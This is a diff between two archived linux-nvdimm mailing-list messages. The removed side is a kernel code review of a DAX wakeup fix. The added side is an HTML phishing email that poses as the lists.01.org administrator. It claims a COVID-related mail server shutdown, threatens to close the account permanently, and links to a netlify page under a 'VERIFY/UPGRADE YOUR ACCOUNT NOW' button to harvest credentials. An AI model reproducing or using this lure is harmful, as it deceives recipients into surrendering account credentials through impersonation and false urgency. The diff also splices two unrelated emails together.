@@ -2,132 +2,135 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [198.145.21.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id AE5323667F4
-	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 11:27:03 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 23582366807
+	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 11:32:17 +0200 (CEST)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id 7A519100EAB51;
-	Wed, 21 Apr 2021 02:26:51 -0700 (PDT)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=195.135.220.15; helo=mx2.suse.de; envelope-from=jack@suse.cz; receiver=<UNKNOWN> 
-Received: from mx2.suse.de (mx2.suse.de [195.135.220.15])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id 21FE0100EB349
-	for <linux-nvdimm@lists.01.org>; Wed, 21 Apr 2021 02:26:47 -0700 (PDT)
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Received: from relay2.suse.de (unknown [195.135.221.27])
-	by mx2.suse.de (Postfix) with ESMTP id A8E0BAE06;
-	Wed, 21 Apr 2021 09:26:45 +0000 (UTC)
-Received: by quack2.suse.cz (Postfix, from userid 1000)
-	id 80B9F1F2B69; Wed, 21 Apr 2021 11:26:45 +0200 (CEST)
-Date: Wed, 21 Apr 2021 11:26:45 +0200
-From: Jan Kara <jack@suse.cz>
-To: Vivek Goyal <vgoyal@redhat.com>
-Subject: Re: [PATCH v3 3/3] dax: Wake up all waiters after invalidating dax
- entry
-Message-ID: <20210421092645.GO8706@quack2.suse.cz>
-References: <20210419213636.1514816-1-vgoyal@redhat.com>
- <20210419213636.1514816-4-vgoyal@redhat.com>
+	by ml01.01.org (Postfix) with ESMTP id E9212100EAB54;
+	Wed, 21 Apr 2021 02:32:14 -0700 (PDT)
+Received-SPF: None (mailfrom) identity=mailfrom; client-ip=198.23.206.55; helo=198-23-206-55-host.colocrossing.com; envelope-from=admin@lists.01.org; receiver=<UNKNOWN> 
+Received: from 198-23-206-55-host.colocrossing.com (unknown [198.23.206.55])
+	by ml01.01.org (Postfix) with ESMTP id 7E430100EAB51
+	for <linux-nvdimm@lists.01.org>; Wed, 21 Apr 2021 02:32:09 -0700 (PDT)
+From: lists.01.org Administrator <admin@lists.01.org>
+To: linux-nvdimm@lists.01.org
+Subject: 70205  Message From lists.01.org #qgod
+Date: 21 Apr 2021 11:32:03 +0200
+Message-ID: <20210421113203.F1E09C932C9BFC33@lists.01.org>
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <20210419213636.1514816-4-vgoyal@redhat.com>
-User-Agent: Mutt/1.10.1 (2018-07-13)
-Message-ID-Hash: FQF6QYLQUTOVVHPYEIUBGBA2P7JJABZR
-X-Message-ID-Hash: FQF6QYLQUTOVVHPYEIUBGBA2P7JJABZR
-X-MailFrom: jack@suse.cz
+Message-ID-Hash: 2LDENEVYL4LVEEK3AXELCGXHSGCCSSA3
+X-Message-ID-Hash: 2LDENEVYL4LVEEK3AXELCGXHSGCCSSA3
+X-MailFrom: admin@lists.01.org
 X-Mailman-Rule-Hits: nonmember-moderation
 X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
-CC: linux-fsdevel@vger.kernel.org, jack@suse.cz, willy@infradead.org, virtio-fs@redhat.com, slp@redhat.com, miklos@szeredi.hu, linux-nvdimm@lists.01.org, linux-kernel@vger.kernel.org
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/FQF6QYLQUTOVVHPYEIUBGBA2P7JJABZR/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/2LDENEVYL4LVEEK3AXELCGXHSGCCSSA3/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============8663099518988293840=="
+
+--===============8663099518988293840==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19597"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><FONT size=3D7>
+<SPAN style=3D"FONT-SIZE: xx-large"><SPAN style=3D"COLOR: rgb(106,168,79)">=
+<SPAN style=3D'FONT-FAMILY: "arial black", sans-serif'><FONT size=3D5>linux=
+-nvdimm@lists.01.org&nbsp;<WBR>LAST WARNING!</FONT></SPAN><SPAN style=3D"FO=
+NT-FAMILY: Arial"><FONT size=3D7>&nbsp;</FONT></SPAN></SPAN></SPAN></FONT><=
+SPAN style=3D"FONT-FAMILY: Arial">&nbsp;&nbsp;</SPAN><BR style=3D"FONT-SIZE=
+: 13px; FONT-FAMILY: Calibri, Helvetica, sans-serif, serif, EmojiFont; COLO=
+R: rgb(33,33,33)">
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial, sans-serif, serif, Emoj=
+iFont; COLOR: rgb(0,0,0)"><BR><BR></SPAN><B>
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: arial,=
+ sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: bas=
+eline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(33,33,33); PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORD=
+ER-TOP-WIDTH: 0px; font-stretch: inherit; font-variant-numeric: inherit; fo=
+nt-variant-east-asian: inherit">
+Shutdown due to Covid 19 Virus.We have noticed that many email servers are =
+interrupted and infiltrated during this pandemic,this may cause mailbox fai=
+lure,or you may not be able to receive or send multiple emails.To continue =
+using your mailbox.</SPAN><SPAN>&nbsp;</SPAN></B><B>&nbsp;</B></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><B><BR></B>
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial, sans-serif, serif, Emoj=
+iFont; COLOR: rgb(0,0,0)"><BR><BR></SPAN><SPAN style=3D'FONT-FAMILY: "arial=
+ black", sans-serif'>
+<A style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(103,171,73) 11px solid; BORDER=
+-RIGHT: rgb(103,171,73) 20px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
+: rgb(103,171,73) 11px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: rgb(103,171=
+,73) 20px solid; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(103,171,73); fon=
+t-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian:=
+ inherit"=20
+href=3D"https://cocky-booth-585f8b.netlify.app/#linux-nvdimm@lists.01.org" =
+shape=3Drect rel=3Dnoreferrer><SPAN lang=3Dzh-CN>VERIFY/UPGRADE YOUR ACCOUN=
+T NOW</SPAN></A>&nbsp;&nbsp;</SPAN><BR style=3D"FONT-SIZE: 13px; FONT-FAMIL=
+Y: Calibri, Helvetica, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)">=
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri, Helvetica, sans-serif=
+, serif, EmojiFont; COLOR: rgb(0,0,0)"><BR></SPAN>
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri, Helvetica, sans-serif=
+, serif, EmojiFont; COLOR: rgb(0,0,0)"><BR><BR><FONT face=3D"Times New Roma=
+n"><B><FONT size=3D3>Note:&nbsp;A</FONT><SPAN style=3D"FONT-SIZE: medium; C=
+OLOR: rgb(33,33,33)"><FONT size=3D4><SPAN>&nbsp;</SPAN>ccount will be perma=
+nently closed for failure to verify/upgrade your email.</FONT></SPAN></B></=
+FONT><BR style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri, Helvetica, sans-se=
+rif, serif, EmojiFont; COLOR: rgb(33,33,33)"><BR></SPAN>
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial, sans-serif, serif, Emoj=
+iFont; COLOR: rgb(0,0,0)"><BR></SPAN><B><SPAN style=3D'FONT-FAMILY: "arial =
+black", sans-serif'>
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH:=
+ 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(33,33,=
+33); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-var=
+iant-numeric: inherit; font-variant-east-asian: inherit">Thank you,</SPAN>&=
+nbsp;&nbsp;&nbsp;</SPAN><SPAN style=3D'FONT-FAMILY: "arial black", sans-ser=
+if'><SPAN>&nbsp;</SPAN>
+&nbsp;<BR style=3D"FONT-SIZE: 13px; FONT-WEIGHT: 400; COLOR: rgb(33,33,33)"=
+><SPAN style=3D"COLOR: rgb(33,33,33)"><SPAN style=3D"FONT-SIZE: 15px"><FONT=
+ color=3D#888888 size=3D3><SPAN>lists.01.org&nbsp;</SPAN>Mail Security</FON=
+T></SPAN></SPAN></SPAN><SPAN style=3D"COLOR: rgb(136,136,136)"><BR style=3D=
+"FONT-SIZE: 13px; FONT-FAMILY: Calibri, Helvetica, sans-serif, serif, Emoji=
+Font; FONT-WEIGHT: 400; COLOR: rgb(33,33,33)">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH:=
+ 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: 400;=
+ COLOR: rgb(33,33,33); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch:=
+ inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit">=
+<SPAN style=3D'FONT-FAMILY: "arial black", sans-serif'>(c) 2021<BR><BR></SP=
+AN></SPAN></SPAN></B></DIV></BODY></HTML>
+--===============8663099518988293840==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-On Mon 19-04-21 17:36:36, Vivek Goyal wrote:
-> I am seeing missed wakeups which ultimately lead to a deadlock when I am
-> using virtiofs with DAX enabled and running "make -j". I had to mount
-> virtiofs as rootfs and also reduce to dax window size to 256M to reproduce
-> the problem consistently.
-> 
-> So here is the problem. put_unlocked_entry() wakes up waiters only
-> if entry is not null as well as !dax_is_conflict(entry). But if I
-> call multiple instances of invalidate_inode_pages2() in parallel,
-> then I can run into a situation where there are waiters on
-> this index but nobody will wait these.
-> 
-> invalidate_inode_pages2()
->   invalidate_inode_pages2_range()
->     invalidate_exceptional_entry2()
->       dax_invalidate_mapping_entry_sync()
->         __dax_invalidate_entry() {
->                 xas_lock_irq(&xas);
->                 entry = get_unlocked_entry(&xas, 0);
->                 ...
->                 ...
->                 dax_disassociate_entry(entry, mapping, trunc);
->                 xas_store(&xas, NULL);
->                 ...
->                 ...
->                 put_unlocked_entry(&xas, entry);
->                 xas_unlock_irq(&xas);
->         }
-> 
-> Say a fault in in progress and it has locked entry at offset say "0x1c".
-> Now say three instances of invalidate_inode_pages2() are in progress
-> (A, B, C) and they all try to invalidate entry at offset "0x1c". Given
-> dax entry is locked, all tree instances A, B, C will wait in wait queue.
-> 
-> When dax fault finishes, say A is woken up. It will store NULL entry
-> at index "0x1c" and wake up B. When B comes along it will find "entry=0"
-> at page offset 0x1c and it will call put_unlocked_entry(&xas, 0). And
-> this means put_unlocked_entry() will not wake up next waiter, given
-> the current code. And that means C continues to wait and is not woken
-> up.
-> 
-> This patch fixes the issue by waking up all waiters when a dax entry
-> has been invalidated. This seems to fix the deadlock I am facing
-> and I can make forward progress.
-> 
-> Reported-by: Sergio Lopez <slp@redhat.com>
-> Fixes: ac401cc78242 ("dax: New fault locking")
-> Suggested-by: Dan Williams <dan.j.williams@intel.com>
-> Signed-off-by: Vivek Goyal <vgoyal@redhat.com>
-
-Looks good to me. Thanks for fixing this! Feel free to add:
-
-Reviewed-by: Jan Kara <jack@suse.cz>
-
-								Honza
-
-> ---
->  fs/dax.c | 2 +-
->  1 file changed, 1 insertion(+), 1 deletion(-)
-> 
-> diff --git a/fs/dax.c b/fs/dax.c
-> index f19d76a6a493..cc497519be83 100644
-> --- a/fs/dax.c
-> +++ b/fs/dax.c
-> @@ -676,7 +676,7 @@ static int __dax_invalidate_entry(struct address_space *mapping,
->  	mapping->nrexceptional--;
->  	ret = 1;
->  out:
-> -	put_unlocked_entry(&xas, entry, WAKE_NEXT);
-> +	put_unlocked_entry(&xas, entry, WAKE_ALL);
->  	xas_unlock_irq(&xas);
->  	return ret;
->  }
-> -- 
-> 2.25.4
-> 
--- 
-Jan Kara <jack@suse.com>
-SUSE Labs, CR
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
 To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
+
+--===============8663099518988293840==--
